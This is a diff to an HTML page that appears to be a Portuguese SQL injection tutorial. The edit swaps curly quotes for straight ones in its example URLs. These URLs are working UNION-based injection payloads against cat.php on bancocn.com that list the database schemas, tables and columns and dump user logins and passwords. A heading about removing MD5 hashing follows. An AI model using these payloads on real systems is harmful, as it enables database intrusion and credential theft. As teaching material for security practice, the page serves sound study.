@@ -44,15 +44,15 @@ www.bancocn.com/cat.php?id=-1 union select 1, 2, database() //nome do database
 <small><pre id="codigo"><code>
 www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(schema_name) from information_schema.schemata
 <b>Nome das tables:</b>
-www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=”bancocn”
+www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema="bancocn"
 <b>Nome das columns:</b>
-www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(column_name) from information_schema.columns where table_schema=”bancocn” and table_name=”users”
+www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(column_name) from information_schema.columns where table_schema="bancocn" and table_name="users"
 </code></pre></small>
             <br>
             <h4>Dados das Columns</h4>
 <small><pre id="codigo"><code>
 www.bancocn.com/cat.php?id=-1 union select 1, 2, login from bancocn.users
-www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(id, “ ”, login, “ ”, password) from bancocn.users
+www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(id, " ", login, " ", password) from bancocn.users
 </code></pre></small>
             <br>
             <h4>Remover criptografia MD5</h4>
